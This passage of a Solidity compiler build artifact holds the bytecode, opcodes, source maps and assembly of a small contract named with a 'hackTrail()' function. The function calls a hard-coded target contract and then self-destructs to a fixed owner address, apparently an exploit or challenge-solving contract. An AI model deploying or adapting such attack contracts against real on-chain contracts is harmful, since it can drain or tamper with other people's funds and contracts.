							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x256 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x22 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x157BCA60 EQ PUSH2 0x64 JUMPI PUSH2 0x5F JUMP JUMPDEST CALLDATASIZE PUSH2 0x5F JUMPI PUSH4 0x4C228CC7 PUSH1 0x0 MSTORE PUSH1 0x0 DUP1 PUSH1 0x4 PUSH1 0x0 DUP1 PUSH20 0xCD7AB80DA7C893F86FA8DEDDF862B74D94F4478E GAS CALL PUSH1 0x0 DUP2 EQ ISZERO PUSH2 0x5C JUMPI RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x70 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x79 PUSH2 0x7B JUMP JUMPDEST STOP JUMPDEST PUSH20 0x798349E06C67272465123B91BD88C5D19B8C7878 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0xFD JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xF4 SWAP1 PUSH2 0x200 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xCD7AB80DA7C893F86FA8DEDDF862B74D94F4478E SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x4C228CC7 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x15E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x172 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH20 0x798349E06C67272465123B91BD88C5D19B8C7878 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x6C6F6C20686F772064696420796F75206576656E2066696E6420746869733F00 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1EA PUSH1 0x1F DUP4 PUSH2 0x1A3 JUMP JUMPDEST SWAP2 POP PUSH2 0x1F5 DUP3 PUSH2 0x1B4 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x219 DUP2 PUSH2 0x1DD JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 RETURN PUSH24 0xD757080E0787354B419F21C5E389E3DF5AFBEB1FB0D920A9 DUP10 0xD2 0xD3 0xC6 EXP 0xBD PUSH5 0x736F6C6343 STOP ADDMOD EXP STOP CALLER ",
							"sourceMap": "559:766:0:-:0;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@_100": {
									"entryPoint": null,
									"id": 100,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@hackTrail_95": {
									"entryPoint": 123,
									"id": 95,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_encode_t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22_to_t_string_memory_ptr_fromStack": {
									"entryPoint": 477,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": 512,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_string_memory_ptr_fromStack": {
									"entryPoint": 419,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"store_literal_in_memory_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22": {
									"entryPoint": 436,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1163:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "103:73:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "120:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "125:6:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "113:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "113:19:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "113:19:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "141:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "160:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "165:4:1",
																		"type": "",
																		"value": "0x20"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "156:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "156:14:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "141:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "75:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "80:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "91:11:1",
														"type": ""
													}
												],
												"src": "7:169:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "288:75:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "memPtr",
																				"nodeType": "YulIdentifier",
																				"src": "310:6:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "318:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "306:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "306:14:1"
																	},
																	{
																		"hexValue": "6c6f6c20686f772064696420796f75206576656e2066696e6420746869733f",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "322:33:1",
																		"type": "",
																		"value": "lol how did you even find this?"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "299:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "299:57:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "299:57:1"
														}
													]
												},
												"name": "store_literal_in_memory_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "280:6:1",
														"type": ""
													}
												],
												"src": "182:181:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "515:220:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "525:74:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "591:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "596:2:1",
																		"type": "",
																		"value": "31"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "532:58:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "532:67:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "525:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "697:3:1"
																	}
																],
																"functionName": {
																	"name": "store_literal_in_memory_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22",
																	"nodeType": "YulIdentifier",
																	"src": "608:88:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "608:93:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "608:93:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "710:19:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "721:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "726:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "717:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "717:12:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "710:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22_to_t_string_memory_ptr_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "503:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "511:3:1",
														"type": ""
													}
												],
												"src": "369:366:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "912:248:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "922:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "934:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "945:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "930:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "930:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "922:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "969:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "980:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "965:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "965:17:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "tail",
																				"nodeType": "YulIdentifier",
																				"src": "988:4:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "994:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "984:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "984:20:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "958:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "958:47:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "958:47:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1014:139:1",
															"value": {
																"arguments": [
																	{
																		"name": "tail",
																		"nodeType": "YulIdentifier",
																		"src": "1148:4:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22_to_t_string_memory_ptr_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1022:124:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1022:131:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1014:4:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22__to_t_string_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "892:9:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "907:4:1",
														"type": ""
													}
												],
												"src": "741:419:1"
											}
										]
									},
									"contents": "{\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function store_literal_in_memory_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22(memPtr) {\n\n        mstore(add(memPtr, 0), \"lol how did you even find this?\")\n\n    }\n\n    function abi_encode_t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 31)\n        store_literal_in_memory_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_tuple_t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052600436106100225760003560e01c8063157bca60146100645761005f565b3661005f57634c228cc7600052600080600460008073cd7ab80da7c893f86fa8deddf862b74d94f4478e5af1600081141561005c573d6000fd5b50005b600080fd5b34801561007057600080fd5b5061007961007b565b005b73798349e06c67272465123b91bd88c5d19b8c787873ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146100fd576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100f490610200565b60405180910390fd5b600073cd7ab80da7c893f86fa8deddf862b74d94f4478e90508073ffffffffffffffffffffffffffffffffffffffff16634c228cc76040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561015e57600080fd5b505af1158015610172573d6000803e3d6000fd5b5050505073798349e06c67272465123b91bd88c5d19b8c787873ffffffffffffffffffffffffffffffffffffffff16ff5b600082825260208201905092915050565b7f6c6f6c20686f772064696420796f75206576656e2066696e6420746869733f00600082015250565b60006101ea601f836101a3565b91506101f5826101b4565b602082019050919050565b60006020820190508181036000830152610219816101dd565b905091905056fea2646970667358221220f377d757080e0787354b419f21c5e389e3df5afbeb1fb0d920a989d2d3c60abd64736f6c634300080a0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x22 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x157BCA60 EQ PUSH2 0x64 JUMPI PUSH2 0x5F JUMP JUMPDEST CALLDATASIZE PUSH2 0x5F JUMPI PUSH4 0x4C228CC7 PUSH1 0x0 MSTORE PUSH1 0x0 DUP1 PUSH1 0x4 PUSH1 0x0 DUP1 PUSH20 0xCD7AB80DA7C893F86FA8DEDDF862B74D94F4478E GAS CALL PUSH1 0x0 DUP2 EQ ISZERO PUSH2 0x5C JUMPI RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x70 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x79 PUSH2 0x7B JUMP JUMPDEST STOP JUMPDEST PUSH20 0x798349E06C67272465123B91BD88C5D19B8C7878 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0xFD JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xF4 SWAP1 PUSH2 0x200 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xCD7AB80DA7C893F86FA8DEDDF862B74D94F4478E SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x4C228CC7 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x15E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x172 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH20 0x798349E06C67272465123B91BD88C5D19B8C7878 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x6C6F6C20686F772064696420796F75206576656E2066696E6420746869733F00 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1EA PUSH1 0x1F DUP4 PUSH2 0x1A3 JUMP JUMPDEST SWAP2 POP PUSH2 0x1F5 DUP3 PUSH2 0x1B4 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x219 DUP2 PUSH2 0x1DD JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 RETURN PUSH24 0xD757080E0787354B419F21C5E389E3DF5AFBEB1FB0D920A9 DUP10 0xD2 0xD3 0xC6 EXP 0xBD PUSH5 0x736F6C6343 STOP ADDMOD EXP STOP CALLER ",
							"sourceMap": "559:766:0:-:0;;;;;;;;;;;;;;;;;;;;;;;1140:10;1137:1;1130:21;1211:1;1209;1207;1205;1203;1189:13;1183:5;1178:35;1240:1;1233:5;1230:12;1227:77;;;1272:16;1269:1;1262:27;1227:77;1115:200;559:766;;;;;848:212;;;;;;;;;;;;;:::i;:::-;;;741:42;719:65;;:10;:65;;;711:109;;;;;;;;;;;;:::i;:::-;;;;;;;;;898:20:::1;631:42;898:48;;957:9;:17;;;:19;;;;;;;;;;;;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;::::0;::::1;;;;;;;;;1008:42;987:65;;;7:169:1::0;91:11;125:6;120:3;113:19;165:4;160:3;156:14;141:29;;7:169;;;;:::o;182:181::-;322:33;318:1;310:6;306:14;299:57;182:181;:::o;369:366::-;511:3;532:67;596:2;591:3;532:67;:::i;:::-;525:74;;608:93;697:3;608:93;:::i;:::-;726:2;721:3;717:12;710:19;;369:366;;;:::o;741:419::-;907:4;945:2;934:9;930:18;922:26;;994:9;988:4;984:20;980:1;969:9;965:17;958:47;1022:131;1148:4;1022:131;:::i;:::-;1014:139;;741:419;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "119600",
								"executionCost": "165",
								"totalCost": "119765"
							},
							"external": {
								"hackTrail()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 559,
									"end": 1325,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 559,
									"end": 1325,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220f377d757080e0787354b419f21c5e389e3df5afbeb1fb0d920a989d2d3c60abd64736f6c634300080a0033",
									".code": [
										{
											"begin": 559,
											"end": 1325,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "PUSH",
											"source": 0,
											"value": "157BCA60"
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1140,
											"end": 1150,
											"name": "PUSH",
											"source": 0,
											"value": "4C228CC7"
										},
										{
											"begin": 1137,
											"end": 1138,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1130,
											"end": 1151,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1211,
											"end": 1212,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1209,
											"end": 1210,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1207,
											"end": 1208,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 1205,
											"end": 1206,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1203,
											"end": 1204,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1189,
											"end": 1202,
											"name": "PUSH",
											"source": 0,
											"value": "CD7AB80DA7C893F86FA8DEDDF862B74D94F4478E"
										},
										{
											"begin": 1183,
											"end": 1188,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 1178,
											"end": 1213,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 1240,
											"end": 1241,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1233,
											"end": 1238,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1230,
											"end": 1242,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1227,
											"end": 1304,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1227,
											"end": 1304,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 1227,
											"end": 1304,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1272,
											"end": 1288,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1269,
											"end": 1270,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1262,
											"end": 1289,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1227,
											"end": 1304,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 1227,
											"end": 1304,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1115,
											"end": 1315,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 559,
											"end": 1325,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 848,
											"end": 1060,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 848,
											"end": 1060,
